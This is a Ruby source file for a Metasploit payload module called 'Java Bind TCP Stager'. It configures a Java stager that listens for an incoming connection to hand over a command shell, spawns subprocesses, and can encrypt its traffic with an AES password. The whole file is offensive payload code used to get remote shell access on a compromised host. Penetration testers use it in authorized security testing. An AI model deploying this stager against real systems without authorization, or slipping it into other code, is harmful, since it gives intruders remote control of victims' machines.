##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Java

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Java Bind TCP Stager',
      'Description'   => 'Listen for a connection',
      'Author'        => [
          'mihi',  # all the hard work
          'egypt', # msf integration
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'java',
      'Arch'          => ARCH_JAVA,
      'Handler'       => Msf::Handler::BindTcp,
      'Convention'    => 'javasocket',
      'Stager'        => {'Payload' => ""}
      ))

    register_advanced_options(
      [
        Msf::OptString.new('AESPassword', [ false, "Password for encrypting communication", '' ]),
        Msf::OptInt.new('Spawn', [ true, "Number of subprocesses to spawn", 2 ])
      ], self.class
    )

    @class_files = [ ]
  end

  def config
    spawn = datastore["Spawn"] || 2
    c =  ""
    c << "Spawn=#{spawn}\n"
    pass = datastore["AESPassword"] || ""
    if pass != ""
      c << "AESPassword=#{pass}\n"
      @class_files = [
        [ "metasploit", "AESEncryption.class" ],
      ]
    else
      @class_files = [ ]
    end
    c << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]

    c
  end

end
